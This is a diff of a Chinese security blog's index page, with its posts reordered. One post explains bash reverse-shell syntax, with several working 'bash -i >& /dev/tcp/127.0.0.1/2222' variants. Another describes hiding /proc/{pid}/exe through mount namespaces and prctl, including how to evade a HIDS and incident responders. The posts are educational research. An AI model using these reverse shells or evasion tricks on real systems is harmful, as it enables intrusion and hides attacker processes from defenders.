+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note the following further points:</span><br><span class="line"></span><br><span class="line">  *  All threads other than the calling thread are destroyed during an execve().  Mutexes, condition variables, and other pthreads objects are not preserved.</span><br></pre></td></tr></table></figure>
+
+<p>自己测试了一下，可以验证”线程会被销毁”的结论。</p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/277852e2e741eb24b0b4bb8dc0220ef2">测试代码</a>，运行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@vm10-50-0-18 ~]# gcc y.c -lpthread &amp;&amp; .&#x2F;a.out</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">[root@vm10-50-0-18 root]#</span><br></pre></td></tr></table></figure>
 </li>
-<li><p><code>/dev/tcp/127.0.0.1/2222</code> 是什么？</p>
-<p>  它不是文件，只是bash解释器会对/dev/tcp对特殊处理，代表了一个tcp socket。</p>
-<p>  所以如果其他的sh解释器，如zsh、ksh等没有这个特殊解释时，就不能用这个来打开socket。</p>
-<p>  更详细的可以看参考资料</p>
+<li><p>这种方式的对抗效果怎么样？</p>
+<p>原文第一种execve方式，我不太清楚使用场景：既然都execve来替换程序了，为什么不直接退出程序呢？</p>
+<p>第二种”prctl系统调用”方式，对”应急响应人员”来说，迷惑性应该是很大的。对”hids产品”来说，prctl系统调用会是一个监控点。</p>
+<p>比如字节hids对prctl系统调用是有监控的，可以参考<a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/tree/main/driver">elkeid的系统调用hook列表</a>。不过目前只有prctl系统调用的参数是PR_SET_NAME时才上报数据。这里用到的是PR_SET_MM参数，所以会绕过字节hids。</p>
+<p><img src="https://images.gitee.com/uploads/images/2021/1002/235737_79fb7ace_83508.png" alt="图五" title="屏幕截图.png"></p>
 </li>
-<li><p><code>0&gt;&amp;1</code> 是什么？</p>
-<p>  将标准输入重定向到标准输出</p>
-</li>
-<li><p>“&gt;&amp; /dev/tcp/127.0.0.1/2222”  为什么不是 “&gt; /dev/tcp/127.0.0.1/2222”？</p>
-<p>  bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
-<p>  其实是可以的，不过这样标准错误就没有重定向到socket。可以通过查看 /proc/{pid}/fd/ 验证</p>
+<li><p>补充一种”修改软链接内容”的方式</p>
+<p>当使用<code>umount -l</code>卸载时，exe指向的路径也会修改，如下图</p>
+<p><img src="https://images.gitee.com/uploads/images/2021/1018/212605_3229fb08_83508.png" alt="图六" title="屏幕截图.png"></p>
 </li>
 </ul>
-<p>根据上面的了解，可以推导出 这个反弹shell会将自己的标准输入、标准输出、标准错误全部重定向到同一个socket。</p>
-<h1 id="动手实验"><a href="#动手实验" class="headerlink" title="动手实验"></a>动手实验</h1><ol>
-<li><p>验证<code>&gt;&amp;</code>语法</p>
-<p> <code>&amp;&gt;</code>是一种特殊情况</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;111   因为 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;复制文件描述符&quot;来执行。执行命令时因为不存在111文件描述符，所以报错</span><br><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;xxx   因为不是 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;重定向标准输出和标准错误&quot;来执行</span><br><span class="line"></span><br><span class="line">执行结果，只有xxx文件，没有111文件</span><br><span class="line">[root@instance-fj5pftdp t]# ls</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></li>
-<li><p>验证 文件描述符指向 socket</p>
-<p> 执行<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>后的文件描述符指向了同一个socket</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ls -al &#x2F;proc&#x2F;4961&#x2F;fd&#x2F;</span><br><span class="line">总用量 0</span><br><span class="line">dr-x------ 2 root root  0 2月  19 11:26 .</span><br><span class="line">dr-xr-xr-x 9 root root  0 2月  19 11:26 ..</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 0 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 1 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:26 2 -&gt; socket:[201270351]</span><br></pre></td></tr></table></figure>
-
-<p> 如果执行<code>bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>，标准错误描述符就不会指向socket</p>
-<p> 另外命令中需要注意到空格，”[n]&gt;&amp;word”可以写成”[n]&gt;&amp; word”，不可以写成”[n] &gt;&amp;word”</p>
-<p> 比如下面命令反弹shell会有些问题</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1 &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0 &gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p> 而下面命令可以反弹shell</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i 1&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp; 1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;2</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是学习bash相关知识点，包括：</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>从上面分析可以看到，”/proc/{pid}/exe”文件相关信息似乎是不可信的：</p>
 <ul>
-<li>“&gt;&amp;”的两种用法</li>
-<li>“/dev/tcp/127.0.0.1/2222” 不是文件，而是bash解释器对其特殊处理</li>
+<li>“mount命名空间”会改变<code>/proc/&#123;pid&#125;/exe</code>对应文件的内容</li>
+<li>先知文章提到的两种方式会改变<code>/proc/&#123;pid&#125;/exe</code>指向的文件</li>
 </ul>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10736931b93">【bash】关于 /dev/tcp/${HOST}/${PORT}</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80d6b5a61372">Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析</a></li>
-</ul>
+<p>个人感觉：这两种方式都有可能导致hids文件上报出现问题，也可能给”应急人员”的分析过程造成一定阻力。</p>
+<p>但是如果直接<code>cat /proc/&#123;pid&#125;/exe</code>，就会发现仍然可以读到源二进制程序内容。</p>
+<p>那怎么让<code>/proc/&#123;pid&#125;/exe</code>也无法还原出二进制程序呢，这个问题留给读者思考。</p>
+<p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎与我交流。</p>
 
       
     </div>
@@ -1162,7 +1040,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E4%BC%AA%E8%A3%85%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1175,7 +1053,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E4%BC%AA%E8%A3%85%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF/" class="post-title-link" itemprop="url">如何伪装进程信息</a>
+          <a href="/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">分析bash反弹shell的语法</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1199,84 +1077,63 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hWd0EOaBgVbgTBjsdg7QfA">如何改变进程名称</a> 中提到了一些隐藏进程信息的方式，当时遗留有一个问题：不论哪种方式，exe文件仍然有原程序相关信息。</p>
-<p>本文将总结两种”隐藏/proc/{pid}/exe文件”的方式，并浅析两种方式的隐藏效果。</p>
-<p>两种方式包括：</p>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>对下面的反弹shell语法细节有些模糊，故分析一下。</p>
+<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>-i 参数</p>
+<p>  生成交互式shell</p>
+</li>
+<li><p><code>&gt;&amp;</code> 是什么？</p>
+<p>  bash中<code>&gt;&amp;</code>语法比较特殊，有两种解释：</p>
 <ul>
-<li>mount命名空间</li>
-<li>修改软链接内容</li>
-</ul>
-<h1 id="mount命名空间"><a href="#mount命名空间" class="headerlink" title="mount命名空间"></a>mount命名空间</h1><ul>
-<li><p>现象</p>
-<p>思路来源于<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/CSrodJeMFmGNMHyp1PCTSQ">基于Linux Namespaces 特性实现的消音</a></p>
-<p>先来看一个现象：<code>/proc/31867/exe</code>指向的可执行文件内容是一串文本。</p>
-<p><img src="https://images.gitee.com/uploads/images/2021/1002/235514_50f14956_83508.png" alt="图一" title="屏幕截图.png"></p>
-<p>难道文本内容可以被当做二进制文件执行吗？</p>
-<p>答案当然是不行的。这里只是执行/tmp/sleep命令的方式比较特殊，如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# echo 111 &gt; &#x2F;tmp&#x2F;sleep</span><br><span class="line">[root@instance-fj5pftdp ~]# unshare -m bash -c &quot;mount -t tmpfs xx &#x2F;tmp&#x2F;;cp &#x2F;usr&#x2F;bin&#x2F;sleep &#x2F;tmp&#x2F;sleep;&#x2F;tmp&#x2F;sleep 1000&quot; &amp;</span><br><span class="line">[1] 31865</span><br><span class="line">[root@instance-fj5pftdp ~]# ps aux|grep sleep</span><br><span class="line">root      31867  0.0  0.0 108052   612 pts&#x2F;74   S    10:01   0:00 &#x2F;tmp&#x2F;sleep 1000</span><br></pre></td></tr></table></figure>
-
-<p><code>unshare -m</code>命令创建了一个新的”mount命名空间”，然后在这个空间中挂载了tmpfs文件系统，最后执行sleep程序。</p>
+<li><p>后面接数字时，如<code>&gt;&amp;1</code>表示复制文件描述符</p>
 </li>
-<li><p>“mount命名空间”是什么？</p>
-<p>“命名空间”是容器的核心原理之一。从效果上来看，”mount命名空间”可以让宿主机和容器中的”挂载信息”隔离。</p>
-<p>比如在上面例子中，宿主机上执行<code>mount</code>命令是是看不到”tmpfs文件系统被挂载在/tmp”目录下的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# mount | grep xx</span><br><span class="line">[root@instance-fj5pftdp ~]#</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>这种方式的对抗效果怎么样？</p>
-<p>可以从两个场景来评估”对抗效果”：</p>
-<blockquote>
-<p>1.和”应急分析人员”对抗：应急人员是否能够轻易发现异常？</p>
-<p>2.和”安全产品”对抗：安全产品是否能够轻易发现异常？安全产品的上报策略是否受此种方式影响？</p>
-</blockquote>
-<p>从”应急场景”的角度来看，应急分析人员如果很清楚<code>/proc/&#123;PID&#125;/exe</code>指向的文件不可信，可以通过 对比”可疑进程”和1号进程，验证mnt命名空间不同</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;proc&#x2F;31867&#x2F;ns&#x2F;mnt</span><br><span class="line">lrwxrwxrwx 1 root root 0 10月  1 23:42 &#x2F;proc&#x2F;31867&#x2F;ns&#x2F;mnt -&gt; mnt:[4026533456]</span><br><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;proc&#x2F;1&#x2F;ns&#x2F;mnt</span><br><span class="line">lrwxrwxrwx 1 root root 0 10月  1 23:43 &#x2F;proc&#x2F;1&#x2F;ns&#x2F;mnt -&gt; mnt:[4026531840]  &#x2F;&#x2F; 和 4026533456 不同</span><br></pre></td></tr></table></figure>
-
-<p>然后通过nsenter命令获取特定进程的挂载信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# nsenter -m -t 31867 mount|grep &#x2F;tmp</span><br><span class="line">xx on &#x2F;tmp type tmpfs (rw,relatime)</span><br></pre></td></tr></table></figure>
-
-<p>从”安全产品对抗”的角度来看，可以有以下结论：</p>
-<blockquote>
-<p>1.hids可以监控mount系统调用来发现异常；不过不是所有的agent都会监控mount系统调用，比如<a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/tree/main/driver">字节hids</a>就没有。</p>
-<p>2.hids上报文件时，如果是读取软链接指向的文件（比如案例中的/tmp/sleep，而不是/proc/31867/exe），就有可能上报错误的文件。</p>
-</blockquote>
+<li><p>后面接非数字时，如<code>&gt;&amp;xxx</code>表示标准输入和标准输出重定向</p>
+<p>可以查看<code>man bash</code>手册，有详细介绍。</p>
+<p>在这个反弹shell中，第一个<code>&gt;&amp;</code>含义是 把标准输入和标准输出重定向到socket</p>
 </li>
 </ul>
-<h1 id="修改软链接内容"><a href="#修改软链接内容" class="headerlink" title="修改软链接内容"></a>修改软链接内容</h1><ul>
-<li><p>怎么修改软链接内容？</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10235">Linux进程伪装：动态修改/proc/self/exe</a> 文章中总结了两种方法：</p>
-<blockquote>
-<p>1.execve函数</p>
-<p>2.prctl系统调用</p>
-</blockquote>
-<p>读者可直接阅读原文，这里我只记录一个自己看文章时的疑问：如果先创建线程A然后再调用execve，是否线程A还能继续执行？</p>
-<p>答案是不行。</p>
-<p>man 2 execve手册有说明：所有线程都被销毁</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note the following further points:</span><br><span class="line"></span><br><span class="line">  *  All threads other than the calling thread are destroyed during an execve().  Mutexes, condition variables, and other pthreads objects are not preserved.</span><br></pre></td></tr></table></figure>
-
-<p>自己测试了一下，可以验证”线程会被销毁”的结论。</p>
-<p><a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/277852e2e741eb24b0b4bb8dc0220ef2">测试代码</a>，运行结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@vm10-50-0-18 ~]# gcc y.c -lpthread &amp;&amp; .&#x2F;a.out</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">[root@vm10-50-0-18 root]#</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>这种方式的对抗效果怎么样？</p>
-<p>原文第一种execve方式，我不太清楚使用场景：既然都execve来替换程序了，为什么不直接退出程序呢？</p>
-<p>第二种”prctl系统调用”方式，对”应急响应人员”来说，迷惑性应该是很大的。对”hids产品”来说，prctl系统调用会是一个监控点。</p>
-<p>比如字节hids对prctl系统调用是有监控的，可以参考<a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/tree/main/driver">elkeid的系统调用hook列表</a>。不过目前只有prctl系统调用的参数是PR_SET_NAME时才上报数据。这里用到的是PR_SET_MM参数，所以会绕过字节hids。</p>
-<p><img src="https://images.gitee.com/uploads/images/2021/1002/235737_79fb7ace_83508.png" alt="图五" title="屏幕截图.png"></p>
+<li><p><code>/dev/tcp/127.0.0.1/2222</code> 是什么？</p>
+<p>  它不是文件，只是bash解释器会对/dev/tcp对特殊处理，代表了一个tcp socket。</p>
+<p>  所以如果其他的sh解释器，如zsh、ksh等没有这个特殊解释时，就不能用这个来打开socket。</p>
+<p>  更详细的可以看参考资料</p>
 </li>
-<li><p>补充一种”修改软链接内容”的方式</p>
-<p>当使用<code>umount -l</code>卸载时，exe指向的路径也会修改，如下图</p>
-<p><img src="https://images.gitee.com/uploads/images/2021/1018/212605_3229fb08_83508.png" alt="图六" title="屏幕截图.png"></p>
+<li><p><code>0&gt;&amp;1</code> 是什么？</p>
+<p>  将标准输入重定向到标准输出</p>
+</li>
+<li><p>“&gt;&amp; /dev/tcp/127.0.0.1/2222”  为什么不是 “&gt; /dev/tcp/127.0.0.1/2222”？</p>
+<p>  bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
+<p>  其实是可以的，不过这样标准错误就没有重定向到socket。可以通过查看 /proc/{pid}/fd/ 验证</p>
 </li>
 </ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>从上面分析可以看到，”/proc/{pid}/exe”文件相关信息似乎是不可信的：</p>
+<p>根据上面的了解，可以推导出 这个反弹shell会将自己的标准输入、标准输出、标准错误全部重定向到同一个socket。</p>
+<h1 id="动手实验"><a href="#动手实验" class="headerlink" title="动手实验"></a>动手实验</h1><ol>
+<li><p>验证<code>&gt;&amp;</code>语法</p>
+<p> <code>&amp;&gt;</code>是一种特殊情况</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;111   因为 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;复制文件描述符&quot;来执行。执行命令时因为不存在111文件描述符，所以报错</span><br><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;xxx   因为不是 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;重定向标准输出和标准错误&quot;来执行</span><br><span class="line"></span><br><span class="line">执行结果，只有xxx文件，没有111文件</span><br><span class="line">[root@instance-fj5pftdp t]# ls</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></li>
+<li><p>验证 文件描述符指向 socket</p>
+<p> 执行<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>后的文件描述符指向了同一个socket</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ls -al &#x2F;proc&#x2F;4961&#x2F;fd&#x2F;</span><br><span class="line">总用量 0</span><br><span class="line">dr-x------ 2 root root  0 2月  19 11:26 .</span><br><span class="line">dr-xr-xr-x 9 root root  0 2月  19 11:26 ..</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 0 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 1 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:26 2 -&gt; socket:[201270351]</span><br></pre></td></tr></table></figure>
+
+<p> 如果执行<code>bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>，标准错误描述符就不会指向socket</p>
+<p> 另外命令中需要注意到空格，”[n]&gt;&amp;word”可以写成”[n]&gt;&amp; word”，不可以写成”[n] &gt;&amp;word”</p>
+<p> 比如下面命令反弹shell会有些问题</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1 &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0 &gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p> 而下面命令可以反弹shell</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i 1&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp; 1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;2</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是学习bash相关知识点，包括：</p>
 <ul>
-<li>“mount命名空间”会改变<code>/proc/&#123;pid&#125;/exe</code>对应文件的内容</li>
-<li>先知文章提到的两种方式会改变<code>/proc/&#123;pid&#125;/exe</code>指向的文件</li>
+<li>“&gt;&amp;”的两种用法</li>
+<li>“/dev/tcp/127.0.0.1/2222” 不是文件，而是bash解释器对其特殊处理</li>
 </ul>
-<p>个人感觉：这两种方式都有可能导致hids文件上报出现问题，也可能给”应急人员”的分析过程造成一定阻力。</p>
-<p>但是如果直接<code>cat /proc/&#123;pid&#125;/exe</code>，就会发现仍然可以读到源二进制程序内容。</p>
-<p>那怎么让<code>/proc/&#123;pid&#125;/exe</code>也无法还原出二进制程序呢，这个问题留给读者思考。</p>
-<p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎与我交流。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10736931b93">【bash】关于 /dev/tcp/${HOST}/${PORT}</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80d6b5a61372">Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析</a></li>
+</ul>
 
       
     </div>
@@ -1303,7 +1160,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-webshell%E6%A3%80%E6%B5%8B%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1316,7 +1173,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-webshell%E6%A3%80%E6%B5%8B%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">webshell检测总结与实例分析</a>
+          <a href="/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/" class="post-title-link" itemprop="url">requests.get卡住</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1340,104 +1197,176 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>很久之前做过<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/161ffd8e918d70b5029ab828333837c9">webshell检测方案调研</a>，webshell可以在流量安全产品（比如waf、nids）和主机安全产品（hids）检测。</p>
-<p>在流量安全产品常见的检测场景包括：</p>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>之前线上的漏洞扫描遇到一个奇怪的问题:requests.get即使设置了timeout，仍然卡住。</p>
+<p>看lijiejie大佬 <a target="_blank" rel="noopener" href="http://www.lijiejie.com/requests-get-hang/">requests.get 异常hang住</a> 也碰到过这个问题。</p>
+<p>所以，我想要探究以下问题:</p>
 <ul>
-<li>文件上传接口，比如检查上传的文件名、文件内容</li>
-<li>webshell访问，比如检查常见的webshell管理工具</li>
+<li>requests库中timeout参数的具体含义是什么?</li>
+<li>为什么requests.get时timeout参数”失效”?</li>
 </ul>
-<p>在主机安全产品常见的检测场景包括：</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="requests库中timeout参数的具体含义是什么"><a href="#requests库中timeout参数的具体含义是什么" class="headerlink" title="requests库中timeout参数的具体含义是什么?"></a>requests库中timeout参数的具体含义是什么?</h2><ul>
+<li><p>requests库中timeout参数是什么?</p>
+<p>根据<a target="_blank" rel="noopener" href="https://docs.python-requests.org/en/master/user/advanced/#timeouts">官网文档</a>所说,timeout可以表示(connect超时时间,read超时时间)</p>
+</li>
+<li><p>什么是connect超时?</p>
+<p>客户端需要connect系统调用来和服务端做tcp三次握手，当服务地址在互联网上不存在时，connect系统调用耗时就会比较长。</p>
+<p>比如请求1.1.2.3 过一段时间后会返回一个connect tiemout:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<p>在上面请求1.1.2.3这个不存在的ip时，客户端发出的 syn 包没有任何响应，于是客户端会重传syn包</p>
 <ul>
-<li>文本内容，比如检查所有php文件是否webshell</li>
-<li>内存马</li>
+<li>重传次数在 /proc/sys/net/ipv4/tcp_syn_retries 可以配置</li>
+<li>重传间隔时间并不是固定的，在Linux系统上测试结果是 [1,3,7,15,31]s，似乎就是 2^(n+1)-1</li>
 </ul>
-<p>根据网络上公开资料总结，”文本内容”检测手段包括：<br>| webshell检测技术 | 举例<br>| - | - |<br>| 动态分析-沙箱 | <a target="_blank" rel="noopener" href="https://scanner.baidu.com/#/pages/intro">百度webdir</a> |<br>| 静态分析-正则 |<br>| 静态分析-统计学角度 |<br>| 静态分析-AST |<br>| 机器学习/深度学习 |<br>| RASP | <a target="_blank" rel="noopener" href="https://rasp.baidu.com/doc/dev/official.html">百度OpenRASP</a> |</p>
-<p>长亭开源的<a target="_blank" rel="noopener" href="https://github.com/chaitin/cloudwalker">cloudwalker</a>检测方式较全，个人觉得值得学习。</p>
-<p>本文简要分析cloudwalker的检测手段，应该适合正在调研webshell检测方案的读者阅读。</p>
-<blockquote>
-<p>PS: p牛说他们目前的方案已经和开源版本有非常大的不同，目前方案的线上demo：<a target="_blank" rel="noopener" href="https://forum.xray.cool/webshell">https://forum.xray.cool/webshell</a></p>
-</blockquote>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><ul>
-<li><p>cloudwalker是什么？</p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651372030&idx=1&sn=682c49b3decda87ddf0ed641d5d347c6&chksm=8d39c876ba4e4160e88bacf0ffc3cadc39b60a269a6facec9f62134823af829624e42df52376&token=496332164&lang=zh_CN">牧云（CloudWalker）开源手记 | Webshell 监控检测策略初探</a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/45796590">牧云（CloudWalker）开源|如约而至: Webshell核心检测引擎</a></p>
-<p>这两篇官方文章其实已经把检测策略介绍过了，总结起来包括四类：</p>
+<p>如果重试完后仍然没有收到ack包，就会出现connect timeout</p>
+<p>而request的timeout参数就可以减少这个等重传的时间。</p>
